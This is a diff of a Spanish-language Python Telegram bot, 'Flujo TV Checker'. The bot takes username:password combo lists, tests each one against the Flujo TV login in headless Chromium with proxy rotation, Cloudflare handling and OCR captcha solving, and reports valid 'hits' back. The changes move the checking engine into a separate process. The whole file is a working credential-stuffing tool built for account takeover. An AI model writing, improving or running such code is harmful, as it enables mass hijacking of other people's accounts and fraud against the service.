@@ -3,11 +3,11 @@
 """
 ╔══════════════════════════════════════════════════════════════╗
 ║   🎬 Flujo TV — Telegram Bot Checker (VPS Headless)        ║
-║   Envía combo → Procesa → Devuelve hits                    ║
+║   Multiprocessing + Sin single-process                      ║
 ╚══════════════════════════════════════════════════════════════╝
 """
 
-import subprocess, sys, os, time, base64, re, traceback, random, json, threading
+import subprocess, sys, os, time, base64, re, traceback, random, json, multiprocessing
 import urllib.request, urllib.parse, urllib.error
 from datetime import datetime
 
@@ -24,11 +24,14 @@ ADMIN_IDS = []
 BOT_DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_data")
 os.makedirs(BOT_DATA_DIR, exist_ok=True)
 
+# Archivo para comunicar stop entre procesos
+STOP_FILE = "/tmp/flujo_bot_stop"
+
 bot_state = {
     "running": False,
-    "stop_requested": False,
     "current_chat": None,
     "_start_time": None,
+    "_process": None,
 }
 
 def get_proxy_conf():
@@ -95,19 +98,14 @@ def tg_answer_cb(query_id, text=None, show_alert=False):
     return tg_api("answerCallbackQuery", params)
 
 def tg_download_file(file_id):
-    """Descarga archivo de Telegram — URL con /file/ corregida"""
     r = tg_api("getFile", {"file_id": file_id})
-    if not r.get("ok") or not r.get("result", {}).get("file_path"):
-        print(f"  [!] getFile falló: {r}")
-        return None
+    if not r.get("ok") or not r.get("result", {}).get("file_path"): return None
     file_path = r["result"]["file_path"]
     dl_url = f"https://api.telegram.org/file/bot{TG_TOKEN}/{file_path}"
     try:
         with urllib.request.urlopen(dl_url, timeout=60) as resp:
             return resp.read()
-    except Exception as e:
-        print(f"  [!] Error descargando archivo: {e}")
-        return None
+    except: return None
 
 def escape_html(t):
     return str(t).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
@@ -160,7 +158,7 @@ def setup_deps():
     ocr = ensure_mod("ddddocr")
     if not pw: return False, False
     ok, out = run_cmd([sys.executable, "-m", "playwright", "install", "--with-deps", "chromium"], timeout=300)
-    if not ok: print(f"  [!] Chromium: {out[:200]}")
+    if not ok: print(f"  [!] Chromium install: {out[:200]}")
     return True, ocr
 
 # ════════════════════════════════════════════════════════════════════════
@@ -369,10 +367,10 @@ def update_progress(chat_id, msg_id, account_name, result_str, stats):
     except: pass
 
 # ════════════════════════════════════════════════════════════════════════
-#  MOTOR DE CHECK
+#  MOTOR DE CHECK (PROCESO SEPARADO - SOLUCIÓN AL CRASH)
 # ════════════════════════════════════════════════════════════════════════
 
-def run_checker(accounts, chat_id, msg_id, use_proxy=True):
+def run_checker(accounts, chat_id, msg_id, use_proxy):
     from playwright.sync_api import sync_playwright
     hits = []
     hits_lines = []
@@ -386,11 +384,10 @@ def run_checker(accounts, chat_id, msg_id, use_proxy=True):
     }
     ocr_engine = init_ocr()
     use_ocr = ocr_engine is not None
-    if use_ocr: print("  [✓] OCR activo")
-    else: print("  [!] OCR desactivado")
     UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"
 
     with sync_playwright() as p:
+        # SIN --single-process (eso causaba crash en VPS)
         browser = p.chromium.launch(
             headless=True,
             args=[
@@ -398,14 +395,14 @@ def run_checker(accounts, chat_id, msg_id, use_proxy=True):
                 "--no-sandbox", "--disable-dev-shm-usage",
                 "--disable-gpu", "--disable-extensions",
                 "--disable-features=IsolateOrigins,site-per-process",
-                "--single-process",
             ],
         )
         idx = 0
         batch_num = 0
 
         while idx < len(accounts):
-            if bot_state["stop_requested"]:
+            # Leer archivo para saber si hay que parar
+            if os.path.exists(STOP_FILE):
                 try: tg_edit_msg(chat_id, msg_id, "⏹ <b>Detenido por usuario</b>", reply_markup=kb_main())
                 except: pass
                 try: browser.close()
@@ -435,6 +432,8 @@ def run_checker(accounts, chat_id, msg_id, use_proxy=True):
             except Exception as e:
                 print(f"  [!] Context error: {e}")
                 fails += (batch_end - idx); processed += (batch_end - idx)
+                stats["fails"] = fails; stats["processed"] = processed
+                update_progress(chat_id, msg_id, f"Batch {batch_num}", f"Ctx error: {str(e)[:40]}", stats)
                 idx = batch_end; continue
 
             nav_ok = False
@@ -445,7 +444,10 @@ def run_checker(accounts, chat_id, msg_id, use_proxy=True):
                 except: time.sleep(2)
 
             if not nav_ok or not handle_cf(page):
-                fails += (batch_end - idx); processed += (batch_end - idx); idx = batch_end
+                fails += (batch_end - idx); processed += (batch_end - idx)
+                stats["fails"] = fails; stats["processed"] = processed
+                update_progress(chat_id, msg_id, f"Batch {batch_num}", "Nav/CF fail", stats)
+                idx = batch_end
                 try: context.close()
                 except: pass
                 continue
@@ -507,7 +509,7 @@ def run_checker(accounts, chat_id, msg_id, use_proxy=True):
             ip_restricted = False
 
             for local_i in range(batch_end - idx):
-                if bot_state["stop_requested"]: break
+                if os.path.exists(STOP_FILE): break
                 user, pwd = accounts[idx]
                 processed += 1
                 stats["processed"] = processed
@@ -702,7 +704,7 @@ def run_checker(accounts, chat_id, msg_id, use_proxy=True):
     return hits, hits_lines
 
 # ════════════════════════════════════════════════════════════════════════
-#  ESTADO + START CHECK
+#  START CHECK (MULTIPROCESSING EN VEZ DE THREADING)
 # ════════════════════════════════════════════════════════════════════════
 
 waiting_combo = set()
@@ -711,17 +713,21 @@ def start_check(accounts, chat_id):
     if bot_state["running"]:
         tg_send_msg(chat_id, "⏳ Ya hay un check en proceso.", reply_markup=kb_main())
         return
+    
+    # Limpiar flag de stop
+    if os.path.exists(STOP_FILE): os.remove(STOP_FILE)
+    
     bot_state["running"] = True
-    bot_state["stop_requested"] = False
     bot_state["current_chat"] = chat_id
     bot_state["_start_time"] = time.time()
+    
     tg_send_msg(chat_id, f"🚀 <b>Iniciando check...</b>\n📊 {len(accounts)} cuentas")
     r = tg_send_msg(chat_id, "⏳ Preparando...", reply_markup=kb_cancel())
     prog_msg_id = r.get("result", {}).get("message_id") if r.get("ok") else None
 
-    def run():
+    def worker(accounts, chat_id, prog_msg_id, use_proxy):
         try:
-            hits, hits_lines = run_checker(accounts, chat_id, prog_msg_id, use_proxy=True)
+            hits, hits_lines = run_checker(accounts, chat_id, prog_msg_id, use_proxy)
             elapsed = time.time() - bot_state["_start_time"]
             if hits_lines:
                 combo_text = "\n".join(hits_lines)
@@ -746,12 +752,11 @@ def start_check(accounts, chat_id):
             print(f"  [✗] Checker error: {e}\n{traceback.format_exc()[-600:]}")
             try: tg_send_msg(chat_id, err_txt, reply_markup=kb_main())
             except: pass
-        finally:
-            bot_state["running"] = False
-            bot_state["stop_requested"] = False
-            bot_state["current_chat"] = None
 
-    threading.Thread(target=run, daemon=True).start()
+    # MULTIPROCESSING = proceso real separado, no thread
+    p = multiprocessing.Process(target=worker, args=(accounts, chat_id, prog_msg_id, True), daemon=True)
+    p.start()
+    bot_state["_process"] = p
 
 # ════════════════════════════════════════════════════════════════════════
 #  PROCESAR UPDATES
@@ -776,7 +781,6 @@ def process_update(upd):
             if is_doc:
                 doc = msg["document"]
                 file_id = doc["file_id"]
-                fname = doc.get("file_name", "combo.txt")
                 file_data = tg_download_file(file_id)
                 if file_data:
                     combo_text = file_data.decode("utf-8", errors="ignore")
@@ -787,7 +791,7 @@ def process_update(upd):
                     else:
                         tg_send_msg(chat_id, "❌ No se encontraron cuentas válidas en el archivo.", reply_markup=kb_main())
                 else:
-                    tg_send_msg(chat_id, "❌ No pude descargar el archivo. Envía el combo como texto.", reply_markup=kb_main())
+                    tg_send_msg(chat_id, "❌ No pude descargar el archivo.", reply_markup=kb_main())
                 return
 
             elif text and not text.startswith("/"):
@@ -817,7 +821,7 @@ def process_update(upd):
                 tg_send_msg(chat_id, "📤 <b>Envía el combo ahora:</b>\n\nTexto o archivo .txt", reply_markup=kb_cancel())
         elif text == "/stop":
             if bot_state["running"]:
-                bot_state["stop_requested"] = True
+                with open(STOP_FILE, 'w') as f: f.write("1")
                 tg_send_msg(chat_id, "⏹ Deteniendo...")
             else:
                 tg_send_msg(chat_id, "No hay check en proceso.", reply_markup=kb_main())
@@ -855,7 +859,7 @@ def process_update(upd):
                 tg_answer_cb(cbq["id"])
         elif data == "stop":
             if bot_state["running"]:
-                bot_state["stop_requested"] = True
+                with open(STOP_FILE, 'w') as f: f.write("1")
                 tg_answer_cb(cbq["id"], "⏹ Deteniendo...")
             else:
                 tg_answer_cb(cbq["id"], "No hay check activo", show_alert=True)
@@ -882,7 +886,7 @@ def main():
     print(f"  [✓] Playwright OK | OCR: {'✅' if ocr_ok else '❌'}")
     print(f"  [✓] Proxy: {PROXY['host']}:{PROXY['port']}")
     print(f"  [✓] Rotar cada: {ROTATE_EVERY} cuentas")
-    print(f"  [✓] Headless: SÍ")
+    print(f"  [✓] Headless: SÍ | Multiprocessing: SÍ")
     print()
     tg_api("deleteWebhook", {"drop_pending_updates": True})
     print("  [✓] Bot iniciado — Esperando mensajes...")
@@ -891,6 +895,12 @@ def main():
 
     offset = None
     while True:
+        # Auto-limpiar estado cuando el proceso hijo termina
+        if bot_state["running"] and bot_state.get("_process") and not bot_state["_process"].is_alive():
+            bot_state["running"] = False
+            bot_state["current_chat"] = None
+            print("  [*] Proceso de check finalizado.")
+
         try:
             params = {"timeout": 35, "allowed_updates": '["message","callback_query"]'}
             if offset: params["offset"] = offset
